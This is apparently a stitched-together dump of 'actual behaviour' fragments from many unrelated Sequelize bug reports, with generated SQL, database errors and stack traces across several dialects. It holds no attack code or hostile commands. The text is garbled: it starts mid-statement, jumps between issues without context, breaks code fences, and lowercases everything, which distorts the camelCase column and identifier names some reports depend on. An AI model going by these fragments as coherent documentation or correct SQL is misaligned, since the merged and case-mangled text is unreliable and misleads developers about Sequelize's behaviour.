`uuid` binary(16) default uuid_to_bin(uuid()) , primary key (`uuid`)
) engine=innodb;
instead, the generated sql query is ```sql select `id`, `count` from `foo` as `foo`;
the value of actualid is actually overwritten by the value from the id column.
the following sql statements are generated for mysql which are correct
insert into `main_table` (`counter`,`id`,`documentnumber`) values (default,'9c47db92-ff5f-40c2-8700-af4de0597af0','');
insert into `associated_table` (`sometext`,`maintablecounter`) values ('testing',1);
but the following sql insert statements are generated for mssql which would result in error "error converting data type nvarchar to bigint" because it\'s trying to insert the uuid string into the bigint foreign key field.
insert into `main_table` (`id`,`documentnumber`) values (default,'9c47db92-ff5f-40c2-8700-af4de0597af0','');
insert into `associated_table` (`sometext`,`maintablecounter`) values ('testing','9c47db92-ff5f-40c2-8700-af4de0597af0');
``` - dialect: mssql
- database version: all versions
- sequelize version: v4.x, v5.x
_sql is correctly generated
i am able to run it in in my database
however, i receive an internal server error where product.setsubscription is supposed to happen._ ```
insert into "subscriptions" ("id","subscription_fee","created_at","updated_at") values (59,10,\'2020-04-07 22:33:39.324 +00:00\',\'2020-04-07 22:33:39.324 +00:00\') on conflict ("id") do update set "subscription_fee"=excluded."subscription_fee","subscription_reoccurrence"=excluded."subscription_reoccurrence" returning *;
stacktrace:
"typeerror: instance[include.association.accessors.set] is not a function",
" at /users/marina.lohova/work/graphql-server/node_modules/sequelize/lib/model.js:2663:60",
instead, the generated sql query is ```sql select `id` from `listing` as `listing` where `listing`.`foo` like '%[object object]%'
but we get error: `column company->image.imageabletype does not exist` does not exist
sql: `select count("subsidiary"."id") as "count" from "subsidiaries" as "subsidiary" inner join "companies" as "company" on "subsidiary"."company_id" = "company"."id" left outer join "images" as "company->image" on "company"."id" = "company->image"."imageable_id" and ("company->image"."deleted_at" is null and "company->image"."imageabletype" = \'company\')` there should be `"company->image"."imageable_type"` instead of `"company->image"."imageabletype"` but, if we add await company.findone();
let count = await subsidiary.count({ include: [{ association: subsidiary.company, required: true }]
``` everything works, and there is `"company->image"."imageable_type"`.
however, the sql generated by sequelize with ```sql
insert into `articles` (`id`,`product_type`,`purpose`,`pv`,`uv`,`is_deleted`) values (1,'0','0','0',uv+1,'0') on duplicate key update `uv`=values(`uv`)
the generated sql is wrong after the key `on duplicate key`
a different instance is loaded.
/users/simon/projects/vendor/sequelize/test/support.js:25 throw e; ^ error: named bind parameter "$test" has no value in the given object
at /users/simon/projects/vendor/sequelize/lib/dialects/abstract/query.js:102:15 at string.replace (<anonymous>) at function.formatbindparameters (/users/simon/projects/vendor/sequelize/lib/dialects/abstract/query.js:87:15) at function.formatbindparameters (/users/simon/projects/vendor/sequelize/lib/dialects/mysql/query.js:26:25) at /users/simon/projects/vendor/sequelize/lib/sequelize.js:616:52
the error occurs: ```
sequelizedatabaseerror: cannot cast type "enum_rate_weekdays"[] to "enum_rate_weekdays"
it generates names that are longer than 63 characters
select "user"."id", "user"."createdat", "user"."updatedat", "addresses"."id" as "_0", "addresses"."createdat" as "_1", "addresses"."updatedat" as "_2", "addresses->useraddresswithextranamepaddinghelloworldwithextranamepadding"."createdat" as "_3", "addresses->useraddresswithextranamepaddinghelloworldwithextranamepadding"."updatedat" as "_4", "addresses->useraddresswithextranamepaddinghelloworldwithextranamepadding"."userid" as "_5", "addresses->useraddresswithextranamepaddinghelloworldwithextranamepadding"."addressid" as "_6"
from "users" as "user" left outer join ( "useraddresswithextranamepaddinghelloworldwithextranamepadding" as "addresses->useraddresswithextranamepaddinghelloworldwithextranamepadding" inner join "addresses" as "addresses" on "addresses"."id" = "addresses->useraddresswithextranamepaddinghelloworldwithextranamepadding"."addressid") on "user"."id" = "addresses->useraddresswithextranamepaddinghelloworldwithextranamepadding"."userid";
[error] message: operator does not exist: double precision = integer[], stack: sequelizedatabaseerror: operator does not exist: double precision = integer[]
when 43069.0122916667 is passed to getsqltypefromjstype, the precision and scale will be set to 30 and 15.
which in tedios isn't handled correctly.
see issue
sql generaged:
select count(distinct(*)) as `count` from `storageoffers` as `storageoffer`;
``` error returned:
sqlite_error: near \\"*\\": syntax error
test is a number in the user.findall
somethingthatsnull is undefined in the user.create ```
{ test: false, id: 29, text: 'testsequelize', updatedat: 2020-01-29t22:38:18.707z, createdat: 2020-01-29t22:38:18.707z } [ { id: 29, text: 'testsequelize', test: 0, somethingthatsnull: null, createdat: 2020-01-29t22:38:18.000z, updatedat: 2020-01-29t22:38:18.000z } ]
on "metrics": { "votes": 42, "avg_score": "3.50" }
the generated sql query contains all columns in table `participations`
**a [direct link]( #l518) to this line in ci output.** below is a formatted one
select `users`.`id`, `users`.`username`, `users`.`createdat`, `users`.`updatedat`, `tasks`.`id` as `tasks.id`, `tasks`.`name` as `tasks.name`, `tasks`.`description` as `tasks.description`, `tasks`.`createdat` as `tasks.createdat`, `tasks`.`updatedat` as `tasks.updatedat`, `tasks->participates`.`id` as `tasks.participates.id`, -- this line shouldn't exist `tasks->participates`.`role` as `tasks.participates.role`, `tasks->participates`.`createdat` as `tasks.participates.createdat`, -- this line shouldn't exist `tasks->participates`.`updatedat` as `tasks.participates.updatedat`, -- this line shouldn't exist `tasks->participates`.`userid` as `tasks.participates.userid`, -- this line shouldn't exist `tasks->participates`.`taskid` as `tasks.participates.taskid` -- this line shouldn't exist
from `users` as `users` left outer join `participates` as `tasks->participates` on `users`.`id` = `tasks->participates`.`taskid` left outer join `tasks` as `tasks` on `tasks`.`id` = `tasks->participates`.`userid`;
i get the error in the `issue description` above.
the is querying generating like this , ![image]( the sequelize query generator is generating for main table(parent table) is fine, for child table not generating properly, see the above screen shot
please let me know the solution it is very urgent.
postgresql refused the query, saying that an empty array [] cannot be casted to array[]::int[].
sequelize tries to insert a default `id`, which isn't present in the table
executing (default): insert into "foos" ("id","foo","bar","quux","createdat","updatedat") values (default,$1,$2,$3,$4,$5) returning *;
unhandled rejection sequelizedatabaseerror: column "id" of relation "foos" does not exist at query.formaterror (/users/mitch/sequelize/sequelize-bug/node_modules/sequelize/lib/dialects/postgres/query.js:366:16) at query.catch.err (/users/mitch/sequelize/sequelize-bug/node_modules/sequelize/lib/dialects/postgres/query.js:72:18) at trycatcher (/users/mitch/sequelize/sequelize-bug/node_modules/bluebird/js/release/util.js:16:23) at promise._settlepromisefromhandler (/users/mitch/sequelize/sequelize-bug/node_modules/bluebird/js/release/promise.js:547:31) at promise._settlepromise (/users/mitch/sequelize/sequelize-bug/node_modules/bluebird/js/release/promise.js:604:18) at promise._settlepromise0 (/users/mitch/sequelize/sequelize-bug/node_modules/bluebird/js/release/promise.js:649:10) at promise._settlepromises (/users/mitch/sequelize/sequelize-bug/node_modules/bluebird/js/release/promise.js:725:18) at _drainqueuestep (/users/mitch/sequelize/sequelize-bug/node_modules/bluebird/js/release/async.js:93:12) at _drainqueue (/users/mitch/sequelize/sequelize-bug/node_modules/bluebird/js/release/async.js:86:9) at async._drainqueues (/users/mitch/sequelize/sequelize-bug/node_modules/bluebird/js/release/async.js:102:5) at immediate.async.drainqueues [as _onimmediate] (/users/mitch/sequelize/sequelize-bug/node_modules/bluebird/js/release/async.js:15:14) at runcallback (timers.js:705:18) at tryonimmediate (timers.js:676:5) at processimmediate (timers.js:658:5)
post output was: { id: 5, title: "foo", body: "bar", author: { profile: {} }
``` if i explicitly set wanted attributes and virtual one, for example:
attributes: ['id', 'firstname', 'lastname', 'email', 'profile']
``` output will be
{ id: 5, title: "foo", body: "bar", author: { id: 1, firstname: "john", lastname: "doe", email: "john.doe@sequelize.com", profile: { id: 1, firstname: "john", lastname: "doe", email: "john.doe@sequelize.com" } }
* stack trace with 'dialect: mariadb'
executing (default): create table if not exists `users` (`id` integer not null auto_increment , `name` varchar(255), `createdat` datetime not null, `updatedat` datetime not null, primary key (`id`)) engine=innodb;
executing (default): show index from `users`
unhandled rejection typeerror: converting circular structure to json --> starting at object with constructor 'sequelize' | property 'dialect' -> object with constructor 'mariadbdialect' --- property 'sequelize' closes the circle at json.stringify (<anonymous>) at ./node_modules/mocha/lib/runnable.js:422:64 at trycatcher (./node_modules/bluebird/js/release/util.js:16:23) at promise._settlepromisefromhandler (./node_modules/bluebird/js/release/promise.js:547:31) at promise._settlepromise (./node_modules/bluebird/js/release/promise.js:604:18) at promise._settlepromise0 (./node_modules/bluebird/js/release/promise.js:649:10) at promise._settlepromises (./node_modules/bluebird/js/release/promise.js:729:18) at _drainqueuestep (./node_modules/bluebird/js/release/async.js:93:12) at _drainqueue (./node_modules/bluebird/js/release/async.js:86:9) at async._drainqueues (./node_modules/bluebird/js/release/async.js:102:5) at immediate.async.drainqueues [as _onimmediate] (./node_modules/bluebird/js/release/async.js:15:14) at processimmediate (internal/timers.js:439:21)
* stack trace with 'dialect: mysql'
executing (default): create table if not exists `users` (`id` integer not null auto_increment , `name` varchar(255), `createdat` datetime not null, `updatedat` datetime not null, primary key (`id`)) engine=innodb;
executing (default): show index from `users`
unhandled rejection typeerror: converting circular structure to json --> starting at object with constructor 'sequelize' | property 'dialect' -> object with constructor 'mysqldialect' --- property 'sequelize' closes the circle at json.stringify (<anonymous>) at ./node_modules/mocha/lib/runnable.js:422:64 at trycatcher (./node_modules/bluebird/js/release/util.js:16:23) at promise._settlepromisefromhandler (./node_modules/bluebird/js/release/promise.js:547:31) at promise._settlepromise (./node_modules/bluebird/js/release/promise.js:604:18) at promise._settlepromise0 (./node_modules/bluebird/js/release/promise.js:649:10) at promise._settlepromises (./node_modules/bluebird/js/release/promise.js:729:18) at _drainqueuestep (./node_modules/bluebird/js/release/async.js:93:12) at _drainqueue (./node_modules/bluebird/js/release/async.js:86:9) at async._drainqueues (./node_modules/bluebird/js/release/async.js:102:5) at immediate.async.drainqueues [as _onimmediate] (./node_modules/bluebird/js/release/async.js:15:14) at processimmediate (internal/timers.js:439:21)
`insert` queries are being executed without checking if the data already exist
when any of the above model is saved, `insert` queries are made to create the locations, but fail because the locations already exist.
invalid query is executed: ```sql
select [channel].*, [tracks].[id] as [tracks.id], [tracks].[token] as [tracks.token], [tracks].[channelid] as [tracks.channelid] from (select [channel].[id] as [id], [channel].[token] as [token], [channel].[id] from [channel] as [channel] where [channel].[token] = n'audinovinky' order by [channel].[id] offset 0 rows fetch next 1 rows only) as [channel] left outer join [track] as [tracks] on [channel].[id] = [tracks].[channelid];
``` or again bit formatted
the bold line is what is new with version 5.18.4 and that is causing an error: ```sql
select [channel].*, [tracks].[id] as [tracks.id], [tracks].[token] as [tracks.token], [tracks].[channelid] as [tracks.channelid]
from (select [channel].[id] as [id], [channel].[token] as [token], [channel].[id] from [channel] as [channel] where [channel].[token] = n'audinovinky' order by [channel].[id] offset 0 rows fetch next 1 rows only) as [channel]
left outer join [track] as [tracks] on [channel].[id] = [tracks].[channelid];
``` as can be seen from the query, the id column is indeed selected twice
the error occurs, this is logged to the console: ```
ops { sequelizedatabaseerror: the column 'id' was specified multiple times for 'channel'
at query.formaterror (/path/to/my/project/node_modules/sequelize/lib/dialects/mssql/query.js:314:12) at request.connection.lib.request [as usercallback] (/path/to/my/project/node_modules/sequelize/lib/dialects/mssql/query.js:74:23) at request.callback (/path/to/my/project/node_modules/tedious/lib/request.js:40:14) at connection.endofmessagemarkerreceived (/path/to/my/project/node_modules/tedious/lib/connection.js:2273:20) at connection.dispatchevent (/path/to/my/project/node_modules/tedious/lib/connection.js:1220:36) at parser.tokenstreamparser.on (/path/to/my/project/node_modules/tedious/lib/connection.js:1023:14) at parser.emit (events.js:182:13) at parser.parser.on.token (/path/to/my/project/node_modules/tedious/lib/token/token-stream-parser.js:27:14) at parser.emit (events.js:182:13) at addchunk (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_readable.js:297:12) at readableaddchunk (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_readable.js:279:11) at parser.readable.push (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_readable.js:240:10) at parser.transform.push (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_transform.js:139:32) at parser.aftertransform (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_transform.js:88:10) at parser._transform (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:41:7) at parser.transform._read (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_transform.js:177:10) at parser.transform._write (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_transform.js:164:83) at dowrite (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_writable.js:405:139) at writeorbuffer (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_writable.js:394:5) at parser.writable.write (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_writable.js:303:11) at parser.addendofmessagemarker (/path/to/my/project/node_modules/tedious/lib/token/token-stream-parser.js:45:24) at connection.message (/path/to/my/project/node_modules/tedious/lib/connection.js:2262:32) name: 'sequelizedatabaseerror', parent: { requesterror: the column 'id' was specified multiple times for 'channel'
at parser.tokenstreamparser.on.token (/path/to/my/project/node_modules/tedious/lib/connection.js:788:27) at parser.emit (events.js:182:13) at parser.parser.on.token (/path/to/my/project/node_modules/tedious/lib/token/token-stream-parser.js:27:14) at parser.emit (events.js:182:13) at addchunk (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_readable.js:297:12) at readableaddchunk (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_readable.js:279:11) at parser.readable.push (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_readable.js:240:10) at parser.transform.push (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_transform.js:139:32) at doneparsing (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:80:14) at token (/path/to/my/project/node_modules/tedious/lib/token/infoerror-token-parser.js:48:5) at call.linenumber (/path/to/my/project/node_modules/tedious/lib/token/infoerror-token-parser.js:13:19) at awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:179:7) at parser.awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:103:7) at parser.readuint32le (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:176:10) at parser.readbvarchar.procname (/path/to/my/project/node_modules/tedious/lib/token/infoerror-token-parser.js:12:90) at readbuffer.data (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:316:9) at awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:308:7) at parser.awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:103:7) at parser.readbuffer (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:305:10) at readuint8.length (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:315:12) at awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:123:7) at parser.awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:103:7) message: 'the column \\'id\\' was specified multiple times for \\'channel\\'.', code: 'erequest', number: 8156, state: 1, class: 16, servername: 'srvname', procname: '', linenumber: 1, sql: 'select [channel].*, [tracks].[id] as [tracks.id], [tracks].[token] as [tracks.token], [tracks].[channelid] as [tracks.channelid] from (select [channel].[id] as [id], [channel].[token] as [token], [channel].[id] from [channel] as [channel] where [channel].[token] = n\\'channel-token\\' order by [channel].[id] offset 0 rows fetch next 1 rows only) as [channel] left outer join [track] as [tracks] on [channel].[id] = [tracks].[channelid];', parameters: undefined }, original: { requesterror: the column 'id' was specified multiple times for 'channel'
at parser.tokenstreamparser.on.token (/path/to/my/project/node_modules/tedious/lib/connection.js:788:27) at parser.emit (events.js:182:13) at parser.parser.on.token (/path/to/my/project/node_modules/tedious/lib/token/token-stream-parser.js:27:14) at parser.emit (events.js:182:13) at addchunk (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_readable.js:297:12) at readableaddchunk (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_readable.js:279:11) at parser.readable.push (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_readable.js:240:10) at parser.transform.push (/path/to/my/project/node_modules/tedious/node_modules/readable-stream/lib/_stream_transform.js:139:32) at doneparsing (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:80:14) at token (/path/to/my/project/node_modules/tedious/lib/token/infoerror-token-parser.js:48:5) at call.linenumber (/path/to/my/project/node_modules/tedious/lib/token/infoerror-token-parser.js:13:19) at awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:179:7) at parser.awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:103:7) at parser.readuint32le (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:176:10) at parser.readbvarchar.procname (/path/to/my/project/node_modules/tedious/lib/token/infoerror-token-parser.js:12:90) at readbuffer.data (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:316:9) at awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:308:7) at parser.awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:103:7) at parser.readbuffer (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:305:10) at readuint8.length (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:315:12) at awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:123:7) at parser.awaitdata (/path/to/my/project/node_modules/tedious/lib/token/stream-parser.js:103:7) message: 'the column \\'id\\' was specified multiple times for \\'channel\\'.', code: 'erequest', number: 8156, state: 1, class: 16, servername: 'srvname', procname: '', linenumber: 1, sql: 'select [channel].*, [tracks].[id] as [tracks.id], [tracks].[token] as [tracks.token], [tracks].[channelid] as [tracks.channelid] from (select [channel].[id] as [id], [channel].[token] as [token], [channel].[id] from [channel] as [channel] where [channel].[token] = n\\'channel-token\\' order by [channel].[id] offset 0 rows fetch next 1 rows only) as [channel] left outer join [track] as [tracks] on [channel].[id] = [tracks].[channelid];', parameters: undefined }, sql: 'select [channel].*, [tracks].[id] as [tracks.id], [tracks].[token] as [tracks.token], [tracks].[channelid] as [tracks.channelid] from (select [channel].[id] as [id], [channel].[token] as [token], [channel].[id] from [channel] as [channel] where [channel].[token] = n\\'channel-token\\' order by [channel].[id] offset 0 rows fetch next 1 rows only) as [channel] left outer join [track] as [tracks] on [channel].[id] = [tracks].[channelid];', parameters: undefined }
mysql create table but without foreign key.
_when using include, fieldname of where statement has unexpected result_ ```
// select * from unit where building_id = 123 // correct
// select * from onother_entity inner join unit on ...
and immeble_id = 123 // wrong!
{ "id": 57, "title": "category z", "slug": "cat-z", "createdat": "2019-11-08t18:14:37.916z", "updatedat": "2019-11-08t18:14:37.926z", "file": { "url": "..." }
it seems that the options: { attibutes: [...]} in .reload() are not respected.
no records are returned
in my own enviornment i'm using sql
and the resulting snippet shows the issue: ![image](
`derivedname` is incorrect, showing "undefined derived!" instead of "test user derived!" (in the case of the sscce)
this indicates that `name` was not accessible via `this.get("name")`, which returned `undefined`.
previous values are undefined
`error: missing from-clause entry for table "projects"`
get the record from db via sequelize const geomobj = await testgeom.findone() console.log(geomobj.geom)
executing (default): select "id", "geom" from "public"."test_geom" as "testgeom" limit 1;
{ type: 'point', coordinates: [ 30, 60 ] }
there is no "crs" property in retrieved geojson object
update retrieved geometry in the table:
```js await testgeom.update({ geom: geomobj.geom }, { where: { id: geomobj.id } })
executing (default): update "public"."test_geom" set "geom"=st_geomfromgeojson(\'{"type":"point","coordinates":[30,60]}\') where "id" = 3
check geometry and srid in the table once again:
select st_srid(geom),* from test_geom
![ ]( there is no "srid" in retrieved record.
see the sscce, `ship.getcaptains()` is returning an empty array
[...initial setup...]
executing (68180761-6e97-443c-a070-9ca00810e563): start transaction;
executing (50539931-2dd5-4b45-be57-6747c2af47e9): start transaction;
executing (68180761-6e97-443c-a070-9ca00810e563): update test1 set id = id where id = 1
executing (50539931-2dd5-4b45-be57-6747c2af47e9): update test2 set id = id where id = 1
executing (68180761-6e97-443c-a070-9ca00810e563): update test2 set id = id where id = 1
executing (50539931-2dd5-4b45-be57-6747c2af47e9): update test1 set id = id where id = 1
(conn=5493, no: 1213, sqlstate: 40001) deadlock found when trying to get lock; try restarting transaction
sql: update test1 set id = id where id = 1 - parameters:[]
t2 status is rollback
sequelizeconnectionacquiretimeouterror: operation timeout at [project]/node_modules/sequelize/lib/dialects/abstract/connection-manager.js:282:52
``` after one second of waiting, the timeout error is thrown for `t3`.
a `sequelizeuniqueconstrainterror` is thrown because the expected multi-field index does not get added to `upsertkeys` here ( #l2705) because it is filtered out.
missing from-clause entry for table \\"user\\"
please see sscce link.
doing this with this model results in the following error:
sequelizedatabaseerror: sqlite_error: near ")": syntax error
the error is referring to the `on conflict()` since it is an error to have an empty `on conflict` clause
this should be:
on conflict('username', 'discordid')
i get the error: ```
named bind parameter "$user3" has no value in the given object.
the events are never fired ```
can't find more than 10000000000000000
the `returning *` substring in the input is being replaced with `returning \\"id\\" into primary_key`
the count is working, the select just selects all the parameters instead of just the distinct padids ```
executing (default): select count(distinct("delta"."padid")) as "count" from "delta" as "delta";
executing (default): select "id", "padid", "authorid", "delta", "deltaid", "createdat", "updatedat" from "delta" as "delta" order by "delta"."padid" asc limit 25 offset 0;
<!-- show what happened
--> _the output was:
project 1: undefined
it is not returning data .
it is returning null
the `title` field was deleted from the output ```
unhandled rejection assertionerror [err_assertion]: [ { yearofrelease: 1977 } ] deepequal [ { title: 'star wars', yearofrelease: 1977 } ]
get an error:
`error: support for literal replacements in the `where` object has been removed.` ``` ```
the second (`sequelize.where(sequelize.col('id'), op.ne, null)`) generate `id is null`
id is null and id is not null
`fail: v_fail returned from showalltables()`
sequelize throws: `unhandled rejection sequelizedatabaseerror: column "username" does not exist`
<!-- show what happened
--> in 5.18.0 through 5.18.4 the following is output instead: ```
error: unknown structure passed to order / group: first at mysqlquerygenerator.quote (/path/node_modules/sequelize/lib/dialects/abstract/query-generator.js:879:11) at mysqlquerygenerator.aliasgrouping (/path/node_modules/sequelize/lib/dialects/abstract/query-generator.js:1407:17) at options.group.array.isarray.options.group.map.t (/path/node_modules/sequelize/lib/dialects/abstract/query-generator.js:1333:82) at array.map (<anonymous>) at mysqlquerygenerator.selectquery (/path/node_modules/sequelize/lib/dialects/abstract/query-generator.js:1333:68) at queryinterface.select (/path/node_modules/sequelize/lib/query-interface.js:1119:27) at promise.try.then.then.then (/path/node_modules/sequelize/lib/model.js:1756:34) at trycatcher (/path/node_modules/bluebird/js/release/util.js:16:23) at promise._settlepromisefromhandler (/path/node_modules/bluebird/js/release/promise.js:512:31) at promise._settlepromise (/path/node_modules/bluebird/js/release/promise.js:569:18) at promise._settlepromise0 (/path/node_modules/bluebird/js/release/promise.js:614:10) at promise._settlepromises (/path/node_modules/bluebird/js/release/promise.js:693:18) at async._drainqueue (/path/node_modules/bluebird/js/release/async.js:133:16) at async._drainqueues (/path/node_modules/bluebird/js/release/async.js:143:10) at immediate.async.drainqueues (/path/node_modules/bluebird/js/release/async.js:17:14) at runcallback (timers.js:810:20) at tryonimmediate (timers.js:768:5) at processimmediate [as _immediatecallback] (timers.js:745:5)
it's sending to database, `showid = null` and `tagid = null`
_the output was: (note that `show_id` is equivalent to `showid`, as it is an underscored model) ```
executing (default): insert into "shows_tags" ("show_id","tag_id","tag_connect_type","created_at","updated_at") values (null,null,\'channel\',\'2019-09-08 21:51:33.930 +06:00\',\'2019-09-08 21:51:33.930 +06:00\') returning *;
unhandled rejection sequelizedatabaseerror: null value in column "show_id" violates not-null constraint
resulting order: order by `associatedmodel1`.`foo` `asc`, `associatedmodel2`.`bar` `asc`, `field1` `asc`, `associatedmodel1`.`foo` `asc`
unhandled rejection typeerror: s.replace is not a function at object.removeticks (c:\\test\ ode_modules\\sequelize\\lib\\utils.js:354:12) at object.quoteidentifier (c:\\test\ ode_modules\\sequelize\\lib\\dialects\\abstract\\query-generator\\helpers\\quote.js:50:35) at postgresquerygenerator.quoteidentifier (c:\\test\ ode_modules\\sequelize\\lib\\dialects\\abstract\\query-generator.js:898:24) at postgresquerygenerator.quotetable (c:\\test\ ode_modules\\sequelize\\lib\\dialects\\abstract\\query-generator.js:945:23) at postgresquerygenerator.addindexquery (c:\\test\ ode_modules\\sequelize\\lib\\dialects\\abstract\\query-generator.js:582:24) at queryinterface.addindex (c:\\test\ ode_modules\\sequelize\\lib\\query-interface.js:658:37) at promise.each.index (c:\\test\ ode_modules\\sequelize\\lib\\model.js:1360:67) at trycatcher (c:\\test\ ode_modules\\bluebird\\js\ elease\\util.js:16:23) at object.gotvalue (c:\\test\ ode_modules\\bluebird\\js\ elease\ educe.js:155:18) at object.gotaccum (c:\\test\ ode_modules\\bluebird\\js\ elease\ educe.js:144:25) at object.trycatcher (c:\\test\ ode_modules\\bluebird\\js\ elease\\util.js:16:23) at promise._settlepromisefromhandler (c:\\test\ ode_modules\\bluebird\\js\ elease\\promise.js:517:31) at promise._settlepromise (c:\\test\ ode_modules\\bluebird\\js\ elease\\promise.js:574:18) at promise._settlepromisectx (c:\\test\ ode_modules\\bluebird\\js\ elease\\promise.js:611:10) at _drainqueuestep (c:\\test\ ode_modules\\bluebird\\js\ elease\\async.js:142:12) at _drainqueue (c:\\test\ ode_modules\\bluebird\\js\ elease\\async.js:131:9) at async._drainqueues (c:\\test\ ode_modules\\bluebird\\js\ elease\\async.js:147:5) at immediate.async.drainqueues [as _onimmediate] (c:\\test\ ode_modules\\bluebird\\js\ elease\\async.js:17:14) at runcallback (timers.js:705:18) at tryonimmediate (timers.js:676:5) at processimmediate (timers.js:658:5)
the updated instance is an instance of foo
using `db.sync({ alter: true })`, column 'systemname' is created
i need 'system_name', not 'systemname'
alter table `test` add `systemname` varchar(32);
alter table `test` drop `system_name`;
